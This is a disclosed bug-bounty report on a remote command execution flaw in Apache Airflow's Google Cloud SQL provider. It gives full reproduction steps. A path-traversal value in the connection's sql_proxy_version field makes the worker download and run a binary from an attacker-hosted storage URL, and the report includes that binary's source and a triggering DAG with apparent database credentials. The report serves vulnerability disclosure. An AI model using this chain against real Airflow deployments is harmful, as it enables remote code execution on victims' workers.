# Apache Airflow Google Cloud Sql Provider Remote Command Execution

## Report Details
- **Report ID**: 1895277
- **URL**: https://hackerone.com/reports/1895277
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-03-07T15:11:10.124Z
- **Disclosed**: 2023-04-16T18:35:53.618Z

## Reporter
- **Username**: sw0rd1ight
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## 0x01 Test environment
airflow 2.5.1
[apache-airflow-providers-google](https://airflow.apache.org/docs/apache-airflow-providers-google/8.8.0/) 8.8.0
Build with docker compose
##  0x02 Reproduction steps
### 2.1 Prepare the malicious executable
Write the following `exec.cpp` file.
```
#include<stdlib.h>
using namespace std;
int main(){
        system("mkdir /tmp/hello");
        return 0;
}
```
In a linux environment, use g++ to compile and rename it to system
```python
g++ exec.cpp -o system
```
{F2213397}
Put the compiled system malicious executable file into Google Cloud Storage, and set the permission to public. My address for this exploit is [https://storage.googleapis.com/swordlight/system](https://storage.googleapis.com/swordlight/system)

### 2.2 Creating a Malicious Google Cloud SQL Database Connection
Create the following Google Cloud SQL Database connection named aaa under Admin->Connections Among them.
Host, Schema, Login, and Port filed are required, just fill in the content that conforms to the format.
{F2213400}
Among them, Extra  filed fills in the actual content as follows, and note that sql_proxy_version is set to `../swordlight/system?a=`
```python
{
  "project_id":"pivotal-gearing-375804",
  "instance":"hellopg",
  "location":"us-central1-b",
  "database_type":"postgres",
  "use_proxy":"True",
  "use_ssl":"False",
  "sql_proxy_use_tcp":"True",
  "sql_proxy_version":"../swordlight/system?a=",
  "sslcert":"",
  "sslkey":"",
  "sslrootcert":""
}
```
### 2.3 Use the CloudSQLExecuteQueryOperator operator in Dag for verification
Create a google_test.py script that uses the CloudSQLExecuteQueryOperator operator. 
Put it in the `/opt/airflow/dags` directory so that it can be automatically loaded by airflow.The content is as follows, where gcp_cloudsql_conn_id is set to the connection name aaa we established above.
```python
from __future__ import annotations

import os
import subprocess
from datetime import datetime
from os.path import expanduser
from urllib.parse import quote_plus

from airflow import models
from airflow.providers.google.cloud.operators.cloud_sql import CloudSQLExecuteQueryOperator


SQL = [
    "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",
    "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",  # shows warnings logged
    "INSERT INTO TABLE_TEST VALUES (0)",
    "CREATE TABLE IF NOT EXISTS TABLE_TEST2 (I INTEGER)",
    "DROP TABLE TABLE_TEST",
    "DROP TABLE TABLE_TEST2",
]


postgres_kwargs = dict(
    user="postgres",
    password=r"ktd2(%EzQ5",
    public_port="5432",
    public_ip="34.122.52.6",
    project_id="pivotal-gearing-375804",
    location="us-central1-b",
    instance="hellopg",
    database="postgres",
    client_cert_file="key/postgres-client-cert.pem",
    client_key_file=".key/postgres-client-key.pem",
    server_ca_file=".key/postgres-server-ca.pem",
)


# Postgres: connect via proxy over TCP
os.environ["AIRFLOW_CONN_PROXY_POSTGRES_TCP"] = (
    "gcpcloudsql://{user}:{password}@{public_ip}:{public_port}/{database}?"
    "database_type=postgres&"
    "project_id={project_id}&"
    "location={location}&"
    "instance={instance}&"
    "use_proxy=True&"
    "sql_proxy_use_tcp=True".format(**postgres_kwargs)
)

connection_names = [
    "proxy_postgres_tcp",
]

with models.DAG(
    dag_id="example_gcp_sql_query",
    start_date=datetime(2021, 1, 1),
    catchup=False,
    tags=["example"],
) as dag:
    prev_task = None


    task = CloudSQLExecuteQueryOperator(
        gcp_cloudsql_conn_id="aaa",gcp_conn_id="proxy_postgres_tcp",task_id="example_gcp_sql_task_proxy_postgres_tcp" , sql=SQL
    )
    tasks.append(task)
    if prev_task:
        prev_task >> task
    prev_task = task

# [END howto_operator_cloudsql_query_operators]
```
{F2213402}
Open the example_gcp_sql_query dag corresponding to our google_test.py script in the UI management interface, and run.
{F2213403}
Click to view the running graph and logs through the Graph menu.
{F2213404}
{F2213405}
It can be seen from the log that the victim machine downloaded the system file form my Google cloud storage address [https://storage.googleapis.com/swordlight/system](), and renamed it to /tmp/39cl4def_cloud_sql_proxy, and then ran.{F2213408}
At the same time, enter the terminal of the worker and you can see that the **hello** folder has been created successfully.
{F2213413}

## Impact

When airflow does not enable authentication, the attacker can modify the existing connection configuration information, so that the dags that use the CloudSQLExecuteQueryOperator in the system will execute malicious commands at runtime

## Attachments
- image.png
- image.png
- image.png
- image.png
- image.png
- image.png
- image.png
- image.png
- image.png
